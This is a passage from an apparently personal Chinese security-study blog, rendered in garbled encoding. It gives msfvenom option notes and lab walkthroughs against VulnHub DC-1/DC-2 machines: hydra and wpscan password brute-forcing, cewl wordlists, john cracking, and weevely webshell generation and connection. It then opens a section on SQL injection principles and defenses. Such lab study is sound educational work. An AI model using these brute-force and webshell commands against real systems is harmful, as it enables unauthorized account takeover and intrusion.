<h5 id="Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°"><a href="#Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°" class="headerlink" title="Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°"></a>Msfvenomå¸¸ç”¨å‘½ä»¤å‚æ•°</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">-l, <span class="comment">--list &lt;type&gt; </span></span><br><span class="line"><span class="comment"># åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„é¡¹ç›®ï¼Œå…¶ä¸­å€¼å¯ä»¥è¢«è®¾ç½®ä¸º payloads, encoders, nops, platforms, archs, encrypt, formatsç­‰ç­‰</span></span><br><span class="line">-p, <span class="comment">--payload &lt;payload&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç‰¹å®šçš„ Payloadï¼Œå¦‚æœè¢«è®¾ç½®ä¸º - ï¼Œé‚£ä¹ˆä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–</span></span><br><span class="line"><span class="comment">--list-options </span></span><br><span class="line"><span class="comment"># åˆ—å‡º--payload &lt;value&gt; çš„æ ‡å‡†ï¼Œé«˜çº§å’Œè§„é¿é€‰é¡¹</span></span><br><span class="line">-f, <span class="comment">--format &lt;format&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®š Payload çš„è¾“å‡ºæ ¼å¼(ä½¿ç”¨ --list formats åˆ—å‡º)</span></span><br><span class="line">-e, <span class="comment">--encoder &lt;encoder&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä½¿ç”¨çš„ Encoder (ä½¿ç”¨ --list encoders åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--sec-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¤§å‹WindowsäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ–°åç§°ã€‚é»˜è®¤å€¼ï¼šéšæœº4ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">--smallest </span></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ‰€æœ‰å¯ç”¨çš„ç¼–ç å™¨ç”Ÿæˆæœ€å°çš„payload</span></span><br><span class="line"><span class="comment">--encrypt &lt;value&gt; </span></span><br><span class="line"><span class="comment"># åº”ç”¨äºshellcodeçš„åŠ å¯†æˆ–ç¼–ç ç±»å‹ (ä½¿ç”¨--list encrypt åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--encrypt-key &lt;value&gt; </span></span><br><span class="line"><span class="comment"># ç”¨äºåŠ å¯†çš„å¯†é’¥</span></span><br><span class="line"><span class="comment">--encrypt-iv &lt;value&gt; </span></span><br><span class="line"><span class="comment"># åŠ å¯†çš„åˆå§‹åŒ–å‘é‡</span></span><br><span class="line">-<span class="keyword">a</span>, <span class="comment">--arch &lt;arch&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®æ ‡ç³»ç»Ÿæ¶æ„(ä½¿ç”¨ --list archs åˆ—å‡º)</span></span><br><span class="line"><span class="comment">--platform &lt;platform&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šç›®æ ‡ç³»ç»Ÿå¹³å° (ä½¿ç”¨ --list platforms åˆ—å‡º)</span></span><br><span class="line">-o, <span class="comment">--out &lt;path&gt; </span></span><br><span class="line"><span class="comment"># ä¿å­˜payloadæ–‡ä»¶</span></span><br><span class="line">-b, <span class="comment">--bad-chars &lt;list&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®éœ€è¦åœ¨ Payload ä¸­é¿å…å‡ºç°çš„å­—ç¬¦ï¼Œå¦‚ï¼š &#x27;\x00\xff&#x27;</span></span><br><span class="line">-n, <span class="comment">--nopsled &lt;length&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®š nop åœ¨ payload ä¸­çš„æ•°é‡</span></span><br><span class="line">-s, <span class="comment">--space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®æœªç»ç¼–ç çš„ Payload çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line"><span class="comment">--encoder-space &lt;length&gt; </span></span><br><span class="line"><span class="comment"># ç¼–ç åçš„ Payload çš„æœ€å¤§é•¿åº¦</span></span><br><span class="line">-i, <span class="comment">--iterations &lt;count&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½® Payload çš„ç¼–ç æ¬¡æ•°</span></span><br><span class="line">-c, <span class="comment">--add-code &lt;path&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šåŒ…å«ä¸€ä¸ªé¢å¤–çš„win32 shellcodeæ–‡ä»¶</span></span><br><span class="line">-x, <span class="comment">--template &lt;path&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span></span><br><span class="line">-k, <span class="comment">--keep </span></span><br><span class="line"><span class="comment"># ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠŸèƒ½ï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span></span><br><span class="line">-v, <span class="comment">--var-name &lt;value&gt; </span></span><br><span class="line"><span class="comment"># æŒ‡å®šä¸€ä¸ªå˜é‡åï¼ˆå½“æ·»åŠ  -f å‚æ•°çš„æ—¶å€™ï¼Œä¾‹å¦‚ -f pythonï¼Œé‚£ä¹ˆè¾“å‡ºä¸º python ä»£ç ï¼Œ payload ä¼šè¢«æŒ‰è¡Œæ ¼å¼åŒ–ä¸º python ä»£ç ï¼Œè¿½åŠ åˆ°ä¸€ä¸ª python å˜é‡ä¸­ï¼Œè¿™ä¸ªå‚æ•°å³ä¸ºæŒ‡å®š python å˜é‡çš„å˜é‡åï¼‰</span></span><br><span class="line">-t, <span class="comment">--timeout &lt;second&gt; </span></span><br><span class="line"><span class="comment"># è®¾ç½®ä»STDINè¯»å–payloadçš„ç­‰å¾…æ—¶é—´ï¼ˆé»˜è®¤ä¸º30,0ä¸ºç¦ç”¨ï¼‰</span></span><br><span class="line">-h, <span class="comment">--help </span></span><br><span class="line"><span class="comment"># å¸®åŠ©</span></span><br></pre></td></tr></table></figure></div>



<h3 id="2ï¼‰hydra"><a href="#2ï¼‰hydra" class="headerlink" title="2ï¼‰hydra"></a>2ï¼‰hydra</h3><p><code>hydraæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„çˆ†ç ´å·¥å…·,æš´åŠ›ç ´è§£å¼±å¯†ç ,æ˜¯ä¸€ä¸ªæ”¯æŒä¼—å¤šåè®®çš„çˆ†ç ´å·¥å…·</code></p>
<p><strong>è¿™é‡Œä»¥vulnhub dc1ä¸ºä¾‹</strong></p>
<p>ç”¨äº†hydra[æµ·å¾·æ‹‰]å·¥å…·ï¼Œå¯¹flag4ç”¨æˆ·è¿›è¡Œçˆ†ç ´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">hydra -l flag4 -p <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt.gz <span class="number">192.168</span>.<span class="number">133.136</span> -vV -f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-læ˜¯æŒ‡å®šç”¨æˆ·æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼Œ-pæ˜¯æŒ‡å®šå¯†ç æˆ–æŒ‡å®šåŒ…å«å¤šä¸ªå¯†ç çš„æ–‡ä»¶ï¼Œsshå°±æ˜¯</span><br><span class="line">ç”¨æˆ·æ‰€åœ¨çš„ç½‘ç«™</span><br><span class="line"></span><br><span class="line">ä¸Šé¢-pçš„æ–‡ä»¶æ˜¯kaliè‡ªå¸¦çš„å¯†ç åŒ…ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨å…¶ä»–çš„</span><br><span class="line"></span><br><span class="line">-s ç«¯å£</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830211739164.png" alt="image-20220830211739164"></p>
<p>è¿™é‡Œå°±çœ‹åˆ°flag4ç”¨æˆ·çš„å¯†ç è¢«çˆ†ç ´å‡ºæ¥ï¼Œæ˜¯orange</p>
<p>ç„¶åç”¨sshè¿æ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">flag4@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.136</span></span><br><span class="line">ç„¶åyes</span><br><span class="line">ç„¶åè¾“å…¥å¯†ç ï¼šorange</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220830211817515.png" alt="image-20220830211817515"></p>
<h3 id="3ï¼‰cewl"><a href="#3ï¼‰cewl" class="headerlink" title="3ï¼‰cewl"></a>3ï¼‰cewl</h3><p> <code>Cewlæ˜¯ä¸€ä¸ªé€šè¿‡æŒ‡å®šurlåŠæ·±åº¦,ä½¿ç”¨çˆ¬è™«æŠ€æœ¯,ç”Ÿæˆå­—å…¸çš„ä¸€ä¸ªå·¥å…·ã€‚Cewlæ˜¯é€šè¿‡rubyç¼–å†™,é€šè¿‡çˆ¬å–ç½‘ç«™å¹¶æå–ç‹¬ç«‹çš„å•è¯ä¿å­˜ä¸ºå­—å…¸,å¯ä»¥å’ŒJohn the Ripperç­‰å·¥å…·é…åˆä½¿ç”¨ã€‚</code></p>
<p><code>ä¸»è¦è¿˜æ˜¯æ ¹æ®ç½‘ç«™è‡ªèº«çš„å…³é”®è¯ï¼Œç„¶åç”Ÿæˆçš„å­—å…¸ï¼Œæ¯”å¦‚cewlï¼Œflagç­‰ç­‰</code></p>
<p><strong>è¿™é‡Œä»¥vulnhub dc2ä¸ºä¾‹</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">-wç­‰åŒäº&gt;   <span class="regexp">//</span>å†™å…¥</span><br><span class="line">-m n       <span class="regexp">//</span>è‡³å°‘ç”Ÿæˆçš„é•¿åº¦ä¸ºnï¼Œé»˜è®¤æ˜¯<span class="number">3</span></span><br><span class="line">-d x       <span class="regexp">//</span>ç”Ÿæˆæ›´å¤§çš„å­—å…¸ï¼Œé»˜è®¤x=<span class="number">2</span></span><br></pre></td></tr></table></figure></div>



<p>æˆ‘ä»¬ç”¨<code>cewl</code>è¯•è¯•ç”Ÿæˆå­—å…¸</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cewl http:<span class="regexp">//</span>dc-<span class="number">2</span>/ &gt;pass.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831221031390.png" alt="image-20220831221031390"></p>
<p>ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆ<code>pass.txt</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> pass.txtï¼ŒæŸ¥çœ‹å†…å®¹</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831221151099.png" alt="image-20220831221151099"></p>
<p>å‘ç°æ˜¯ç”Ÿæˆå¯¹åº”ç½‘ç«™çš„å¯†ç å­—å…¸</p>
<h3 id="4ï¼‰wpscan"><a href="#4ï¼‰wpscan" class="headerlink" title="4ï¼‰wpscan"></a>4ï¼‰wpscan</h3><p><code>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·,å®ƒé‡‡ç”¨Rubyç¼–å†™ èƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´,å…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´</code></p>
<p><strong>è¿™é‡Œä»¥vulnhub dc2ä¸ºä¾‹</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">wpscan -url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br><span class="line"></span><br><span class="line">-e u    <span class="regexp">//</span>æšä¸¾ç”¨æˆ·ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">wpscan -url xx -P xx -U xx</span><br><span class="line">-P passwdspath  <span class="regexp">//</span>å¯†ç å­—å…¸è·¯å¾„ï¼Œæˆ–è€…ç›´æ¥å†™</span><br><span class="line">-U userspath    <span class="regexp">//</span>ç”¨æˆ·åå­—å…¸è·¯å¾„ï¼Œæˆ–è€…ç›´æ¥å†™</span><br></pre></td></tr></table></figure></div>



<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é’ˆå¯¹æ€§å¯¹wordpressè¿›è¡Œæ¸—é€çœ‹çœ‹ï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -e u</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831223359965.png" alt="image-20220831223359965"></p>
<p>ç„¶åå¾€ä¸‹çœ‹ç”¨æˆ·å</p>
<p><img src="/2022/05/31/daily/image-20220831223432802.png" alt="image-20220831223432802"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªï¼Œç„¶åå¯ä»¥å¤åˆ¶ä¸‹æ¥ï¼Œå¼„ä¸€ä¸ªç”¨æˆ·åçš„æ–‡æœ¬ï¼Œå’Œä¹‹å‰çš„<code>pass.txt</code>è¿™ä¸ªå¯†ç æœ¬ä¸€æ ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line">è¾“å…¥vi un.txt,æŠŠadmin <span class="keyword">jerry </span>tomå¤åˆ¶è¿›å»</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831223714569.png" alt="image-20220831223714569"></p>
<p>ç„¶åå°±å¯ä»¥ç»“åˆæˆ‘ä»¬çš„å¯†ç æ–‡æœ¬å’Œç”¨æˆ·åæ–‡æœ¬ï¼Œåˆ©ç”¨wpscanè¿™ä¸ªå·¥å…·ï¼Œè¿›è¡Œçˆ†ç ´æ“ä½œäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥wpscan --url http:<span class="regexp">//</span>dc-<span class="number">2</span> -P pass.txt -U un.txt</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220831223950721.png" alt="image-20220831223950721"></p>
<p>ç¨å¾®ç­‰ä¸€ä¼š</p>
<p><img src="/2022/05/31/daily/image-20220831224205560.png" alt="image-20220831224205560"></p>
<p>adminç”¨æˆ·å¯†ç æ²¡æœ‰æ‰¾åˆ°ï¼Œåº”è¯¥æ˜¯æœ€é«˜æƒé™çš„è´¦å·</p>
<p>ä½†æ˜¯jerryå’Œtomç”¨æˆ·çš„å¯†ç çŸ¥é“äº†</p>
<h3 id="5ï¼‰John"><a href="#5ï¼‰John" class="headerlink" title="5ï¼‰John"></a>5ï¼‰John</h3><p>Johnæ˜¯ä¸€ä¸ªç ´è§£ç³»ç»Ÿå¯†ç çš„å·¥å…·</p>
<p>ä½¿ç”¨å¾ˆç®€å•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">john --show passwd.txt<span class="regexp">//</span>åé¢æ¥çš„æ˜¯å¯†ç æ–‡æœ¬æ–‡ä»¶</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>å°±å¯ä»¥çœ‹åˆ°æ˜æ–‡ä¸º<code>snoopy</code></p>
<h3 id="6ï¼‰weevely"><a href="#6ï¼‰weevely" class="headerlink" title="6ï¼‰weevely"></a>6ï¼‰weevely</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Weevelyæ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c/sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</span><br></pre></td></tr></table></figure></div>

<p>ç”ŸæˆShell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VERILOG"><figure class="iseeu highlight /verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;æ–‡ä»¶å&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure></div>

<p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p>
<p>åˆ©ç”¨è§¦å‘shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>æˆåŠŸè¿›å…¥shell</p>
<h2 id="7-eval-å‡½æ•°å’Œsystem-å‡½æ•°çš„æ¯”è¾ƒ"><a href="#7-eval-å‡½æ•°å’Œsystem-å‡½æ•°çš„æ¯”è¾ƒ" class="headerlink" title="7.eval()å‡½æ•°å’Œsystem()å‡½æ•°çš„æ¯”è¾ƒ"></a>7.eval()å‡½æ•°å’Œsystem()å‡½æ•°çš„æ¯”è¾ƒ</h2><p><code>è®°å½•ä¸€æ¬¡åœ¨æ‰“é¶æœºæ—¶ï¼Œå› ä¸ºå¹³å¸¸ä¹ æƒ¯ç”¨ eval()å‡½æ•°ï¼Œä½†æ˜¯é¶æœºæ‰§è¡Œncç­‰å‘½ä»¤æ—¶ï¼Œeval()å‡½æ•°æ²¡æœ‰ååº”ï¼Œå°±æ˜¯å› ä¸ºå…¶æ˜¯ä»£ç æ‰§è¡Œï¼Œè€Œéå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æŠŠä¸¤è€…æœ¬è´¨çš„ç”¨æ³•ææ‡‚è¿˜æ˜¯å¾ˆå¿…è¦çš„</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>ç±»å‹å‡½æ•°æ˜¯ä»£ç æ‰§è¡Œè€Œä¸æ˜¯å‘½ä»¤æ‰§è¡Œï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>ç±»å‹å‡½æ•°æ˜¯å‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ä»£ç æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>å‡½æ•°é‡Œå¿…é¡»æ˜¯ä¸€ä¸ªç¬¦åˆphpè¯­æ³•çš„è¯­å¥ï¼Œå¦‚æœè¯­å¥ç»“å°¾æ²¡æœ‰åˆ†å·ä¼šæŠ¥é”™ï¼š<span class="built_in">eval</span>()&#x27;d code</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹ç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>WEBå­¦ä¹ </title>
    <url>/2022/05/28/Web-study/</url>
    <content><![CDATA[<p><u><code>å­¦ä¼šä¸€æ ·ä¸œè¥¿ï¼Œæœ€é‡è¦ç‰¹å¾å°±æ˜¯å¯ä»¥æŠŠä¸€ä¸ªçŸ¥è¯†ç‚¹çš„åŸç†å¼„æ‡‚ï¼Œé€ æˆä¸€æ¬¡æˆåŠŸæ³¨å…¥ï¼Œè¦æ³¨æ„åˆ†ææºç å½“ä¸­å¯¼è‡´è¿™ä¸ªæ¼æ´çš„é—®é¢˜ç‚¹ï¼Œåˆåº”è¯¥å¦‚ä½•æ”¹è¿›ä¸é˜²å¾¡ï¼Œ</code></u></p>
<p><u><code>ä¸è¦æ€¥äºæ±‚æˆï¼Œæ…¢å³æ˜¯å¿«ï¼Œå°‘å³æ˜¯å¤š</code></u></p>
<p><u><code>å¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œä¸€äº›çŸ¥è¯†ç‚¹è¿˜æ˜¯è¦å¤šå†™å‡ éæ¥è®°ä½ï¼Œä¸æ˜¯ç®€å•ctrl+c/+vå°±å­¦åˆ°äº†ï¼Œä¸Šæœºè‡ªå·±ç»ƒä¹ ï¼Œæ‰“é¶åœºï¼Œæ°¸è¿œæ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ï¼Œä¸€å®šå­¦ä¼šæ–‡ç« å’Œå®é™…æ“ä½œå¯†åˆ‡ç»“åˆï¼ŒåšæŒåšç¬”è®°</code></u></p>
<p><u><code>å­¦ä¸œè¥¿å°±åªå½“å­¦ä¸€æ¬¡ï¼Œä¸€æ¬¡å­¦åˆ°æœ€å¥½ï¼Œä¸è¦å›«å›µåæ£</code></u></p>
<span id="more"></span>

<h1 id="Webå®‰å…¨å­¦ä¹ "><a href="#Webå®‰å…¨å­¦ä¹ " class="headerlink" title="Webå®‰å…¨å­¦ä¹ "></a>Webå®‰å…¨å­¦ä¹ </h1><h2 id="åŸºç¡€æ¼æ´çŸ¥è¯†ï¼ˆä¸€ï¼‰ã€åŸç†-å±å®³-é˜²å¾¡-åˆ©ç”¨ã€‘"><a href="#åŸºç¡€æ¼æ´çŸ¥è¯†ï¼ˆä¸€ï¼‰ã€åŸç†-å±å®³-é˜²å¾¡-åˆ©ç”¨ã€‘" class="headerlink" title="åŸºç¡€æ¼æ´çŸ¥è¯†ï¼ˆä¸€ï¼‰ã€åŸç†+å±å®³+é˜²å¾¡+åˆ©ç”¨ã€‘"></a>åŸºç¡€æ¼æ´çŸ¥è¯†ï¼ˆä¸€ï¼‰ã€åŸç†+å±å®³+é˜²å¾¡+åˆ©ç”¨ã€‘</h2><p>â€“è½¬è½½åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
<hr>
<h3 id="Sqlæ¼æ´ç¯‡"><a href="#Sqlæ¼æ´ç¯‡" class="headerlink" title="Sqlæ¼æ´ç¯‡"></a>Sqlæ¼æ´ç¯‡</h3><p><a href="#%E4%B8%80%E3%80%81sql">sqlæ¼æ´çŸ¥è¯†ç‚¹è®°å½•</a></p>
<h4 id="1-sqlæ¼æ´åŸç†"><a href="#1-sqlæ¼æ´åŸç†" class="headerlink" title="1.sqlæ¼æ´åŸç†"></a>1.sqlæ¼æ´åŸç†</h4><p>æŒ‡webåº”ç”¨ç¨‹åº<u><strong>å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­</strong></u>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥<u><strong>æ„é€ ä¸åŒçš„sqlè¯­å¥æ¥å¯¹æ•°æ®åº“æ•°æ®åº“çš„æ“ä½œ</strong></u>ã€‚ï¼ˆwebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–è€…è¿‡æ»¤ä¸ä¸¥ï¼Œå°±æŠŠsqlè¯­å¥å¸¦è¿›æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼‰ã€‚</p>
<p>Sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<br>â‘ å‚æ•°ç”¨æˆ·å¯æ§ï¼š<u><strong>å‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„</strong></u>ã€‚<br>â‘¡<u><strong>å‚æ•°ä»£å…¥æ•°æ®åº“æŸ¥è¯¢</strong></u>ï¼šä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ°sqlè¯­å¥ï¼Œä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚</p>
<h4 id="2-å±å®³"><a href="#2-å±å®³" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ æ•°æ®åº“ä¿¡æ¯æ³„æ¼ï¼šæ•°æ®åº“ä¸­å­˜æ”¾çš„<u><strong>ç”¨æˆ·çš„éšç§ä¿¡æ¯çš„æ³„éœ²</strong></u>ã€‚<br>â‘¡ç½‘é¡µç¯¡æ”¹ï¼šé€šè¿‡æ“ä½œæ•°æ®åº“å¯¹ç‰¹å®šç½‘é¡µè¿›è¡Œç¯¡æ”¹ã€‚<br>â‘¢ç½‘ç«™è¢«æŒ‚é©¬ï¼Œä¼ æ’­æ¶æ„è½¯ä»¶ï¼š<u><strong>ä¿®æ”¹æ•°æ®åº“ä¸€äº›å­—æ®µçš„å€¼ï¼ŒåµŒå…¥ç½‘é©¬é“¾æ¥</strong></u>ï¼Œè¿›è¡ŒæŒ‚é©¬æ”»å‡»ã€‚<br>â‘£æ•°æ®åº“è¢«æ¶æ„æ“ä½œï¼šæ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œæ•°æ®åº“çš„ç³»ç»Ÿç®¡ç†å‘˜å¸æˆ·è¢«çªœæ”¹ã€‚<br>â‘¤æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨ã€‚ç»ç”±æ•°æ®åº“æœåŠ¡å™¨æä¾›çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè®©é»‘å®¢å¾—ä»¥ä¿®æ”¹æˆ–æ§åˆ¶æ“ä½œç³»ç»Ÿã€‚<br>â‘¥ç ´åç¡¬ç›˜æ•°æ®ï¼Œç˜«ç—ªå…¨ç³»ç»Ÿã€‚</p>
<h4 id="3-é˜²å¾¡"><a href="#3-é˜²å¾¡" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘ <u><strong>è¿‡æ»¤å±é™©å­—ç¬¦</strong></u>ï¼šä¾‹å¦‚ï¼Œé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…unionã€sleepã€load_fileç­‰å…³é”®å­—ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™é€€å‡ºç¨‹åºã€‚<br>â‘¡ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼šä½¿ç”¨PDOé¢„ç¼–è¯‘è¯­å¥ï¼Œéœ€è¦æ³¨æ„ï¼Œä¸è¦å°†å˜é‡ç›´æ¥æ‹¼æ¥åˆ°PDOè¯­å¥ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨å ä½ç¬¦è¿›è¡Œæ•°æ®åº“çš„å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥è¯¢ã€‚<br>â‘¢ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€ä½¿ç”¨ä¸¥æ ¼çš„æ•°æ®ç±»å‹ã€‚</p>
<hr>
